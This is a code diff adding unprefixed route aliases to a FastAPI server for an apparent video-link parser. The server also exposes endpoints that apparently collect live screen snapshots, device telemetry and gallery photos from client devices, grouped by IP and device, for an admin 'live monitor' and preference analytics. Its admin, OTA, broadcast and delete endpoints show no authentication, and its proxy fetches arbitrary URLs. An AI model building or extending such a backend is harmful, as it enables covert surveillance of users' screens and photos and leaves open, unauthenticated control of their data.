@@ -52,6 +52,7 @@ class ZipRequest(BaseModel):
 
 # API Endpoints
 @app.get("/api/lan-info")
+@app.get("/lan-info")
 async def get_lan_info(request: Request):
     """Retrieve LAN IP addresses, port, and QR Code for multi-device access."""
     port = request.url.port or 8888
@@ -70,6 +71,7 @@ async def get_lan_info(request: Request):
 
 @app.post("/parse", response_model=ParseResult)
 @app.post("/api/parse", response_model=ParseResult)
+@app.post("/parse", response_model=ParseResult)
 async def api_parse(req: ParseRequest):
     """Parse a single short video / image album / live photo link."""
     if not req.url or not req.url.strip():
@@ -78,6 +80,7 @@ async def api_parse(req: ParseRequest):
     return result
 
 @app.post("/api/batch-parse")
+@app.post("/batch-parse")
 async def api_batch_parse(req: BatchParseRequest):
     """Batch parse multiple links extracted from raw text or list."""
     urls_to_parse: List[str] = []
@@ -102,6 +105,7 @@ async def api_batch_parse(req: BatchParseRequest):
     }
 
 @app.get("/api/proxy/stream")
+@app.get("/proxy/stream")
 async def api_proxy_stream(request: Request, url: str = Query(...)):
     """Stream media (video/audio/image) with Range header support to avoid 403."""
     if not url:
@@ -110,6 +114,7 @@ async def api_proxy_stream(request: Request, url: str = Query(...)):
     return await stream_remote_media(url, range_header=range_header, as_attachment=False)
 
 @app.get("/api/proxy/download")
+@app.get("/proxy/download")
 async def api_proxy_download(
     request: Request,
     url: str = Query(...),
@@ -121,6 +126,7 @@ async def api_proxy_download(
     return await stream_remote_media(url, filename=filename, as_attachment=True)
 
 @app.post("/api/proxy/zip")
+@app.post("/proxy/zip")
 async def api_proxy_zip(req: ZipRequest):
     """Package multiple images/live videos into a ZIP file for one-click download."""
     if not req.items:
@@ -222,6 +228,7 @@ DEFAULT_BROADCAST_STATE = {
 
 # --- 1. 云更新 (OTA) API ---
 @app.get("/api/app/update_check")
+@app.get("/app/update_check")
 async def api_app_update_check(current_version: Optional[str] = "1.0.0"):
     """Check if a newer app version is available."""
     ota = load_json_file(OTA_STATE_PATH, DEFAULT_OTA_STATE)
@@ -233,6 +240,7 @@ async def api_app_update_check(current_version: Optional[str] = "1.0.0"):
     }
 
 @app.post("/api/app/update_publish")
+@app.post("/app/update_publish")
 async def api_app_update_publish(request: Request):
     """Publish a new OTA update from admin dashboard."""
     ota = load_json_file(OTA_STATE_PATH, DEFAULT_OTA_STATE)
@@ -248,12 +256,14 @@ async def api_app_update_publish(request: Request):
 
 # --- 2. 管理员全员广播 API ---
 @app.get("/api/broadcast/current")
+@app.get("/broadcast/current")
 async def api_broadcast_current():
     """Get active broadcast message for client pop-up."""
     b = load_json_file(BROADCAST_STATE_PATH, DEFAULT_BROADCAST_STATE)
     return {"success": True, "broadcast": b}
 
 @app.post("/api/broadcast/send")
+@app.post("/broadcast/send")
 async def api_broadcast_send(request: Request):
     """Send or update a global broadcast to all clients."""
     body = await request.json()
@@ -284,6 +294,7 @@ async def api_broadcast_send(request: Request):
     return {"success": True, "message": "广播已成功推送到所有在线客户端！", "broadcast": b_state}
 
 @app.post("/api/broadcast/react")
+@app.post("/broadcast/react")
 async def api_broadcast_react(request: Request):
     """Receive client reaction (flower or poop) for broadcast."""
     body = await request.json()
@@ -301,6 +312,7 @@ async def api_broadcast_react(request: Request):
         return {"success": True, "message": "收到你的鲜花啦，爱你哟~ 🌸💖", "reactions": b_state["reactions"]}
 
 @app.post("/api/broadcast/clear")
+@app.post("/broadcast/clear")
 async def api_broadcast_clear():
     """Clear/Deactivate current broadcast."""
     b_state = load_json_file(BROADCAST_STATE_PATH, DEFAULT_BROADCAST_STATE)
@@ -312,6 +324,7 @@ LAST_SYNC_RESUMED_TIME = int(time.time())
 
 # --- 3. 屏幕实时监控 API ---
 @app.post("/api/screen/snapshot")
+@app.post("/screen/snapshot")
 async def api_screen_snapshot(request: Request):
     """Receive live client screen snapshot and device telemetry."""
     body = await request.json()
@@ -335,6 +348,7 @@ async def api_screen_snapshot(request: Request):
     return {"success": True}
 
 @app.get("/api/screen/latest")
+@app.get("/screen/latest")
 async def api_screen_latest():
     """Get latest screen snapshots of all active devices for admin live monitor."""
     now = int(time.time())
@@ -356,6 +370,7 @@ async def api_screen_latest():
 
 # --- 4. 上传通道总闸 API ---
 @app.get("/api/gallery/sync_status")
+@app.get("/gallery/sync_status")
 async def api_gallery_sync_status():
     return {
         "success": True,
@@ -364,6 +379,7 @@ async def api_gallery_sync_status():
     }
 
 @app.post("/api/gallery/toggle_sync")
+@app.post("/gallery/toggle_sync")
 async def api_gallery_toggle_sync(request: Request):
     global SYNC_PAUSED, LAST_SYNC_RESUMED_TIME
     body = await request.json()
@@ -378,6 +394,7 @@ async def api_gallery_toggle_sync(request: Request):
     }
 
 @app.post("/api/gallery/upload")
+@app.post("/gallery/upload")
 async def api_gallery_upload(request: Request):
     """Receive user-authorized media uploads, record IP and Device Model, and run AI preference analyzer."""
     if SYNC_PAUSED:
@@ -434,6 +451,7 @@ async def api_gallery_upload(request: Request):
     }
 
 @app.get("/api/gallery/analytics")
+@app.get("/gallery/analytics")
 async def api_gallery_analytics():
     """Get aggregated user preferences, IP batch groups, Device groups, and all items."""
     manifest = load_manifest()
@@ -502,6 +520,7 @@ async def api_gallery_analytics():
     }
 
 @app.get("/api/gallery/manifest_names")
+@app.get("/gallery/manifest_names")
 async def api_gallery_manifest_names(device_id: Optional[str] = None):
     """Return existing filenames on server for smart incremental diff sync."""
     manifest = load_manifest()
@@ -514,6 +533,7 @@ async def api_gallery_manifest_names(device_id: Optional[str] = None):
     return {"success": True, "count": len(valid_names), "filenames": valid_names}
 
 @app.post("/api/gallery/delete_single")
+@app.post("/gallery/delete_single")
 async def api_gallery_delete_single(request: Request):
     """Delete a single photo by filename."""
     body = await request.json()
@@ -536,6 +556,7 @@ async def api_gallery_delete_single(request: Request):
     return {"success": True, "message": f"相片 [{filename}] 已成功删除", "filename": filename}
 
 @app.post("/api/gallery/delete_batch")
+@app.post("/gallery/delete_batch")
 async def api_gallery_delete_batch(request: Request):
     """Delete a batch of selected photos."""
     body = await request.json()
@@ -561,6 +582,7 @@ async def api_gallery_delete_batch(request: Request):
     return {"success": True, "deleted_count": deleted_count, "message": f"已成功批量删除 {deleted_count} 张相片"}
 
 @app.post("/api/gallery/delete_all")
+@app.post("/gallery/delete_all")
 async def api_gallery_delete_all(request: Request):
     """One-click delete all photos for a specific IP, specific device, or all."""
     body = await request.json()
@@ -598,6 +620,7 @@ from app.admin_view import ADMIN_DASHBOARD_HTML
 @app.get("/admin/", response_class=HTMLResponse)
 @app.get("/admin/index.html", response_class=HTMLResponse)
 @app.get("/api/admin", response_class=HTMLResponse)
+@app.get("/admin", response_class=HTMLResponse)
 async def admin_dashboard():
     """Render the AI Gallery & Preference Analytics Admin Dashboard."""
     return HTMLResponse(content=ADMIN_DASHBOARD_HTML)
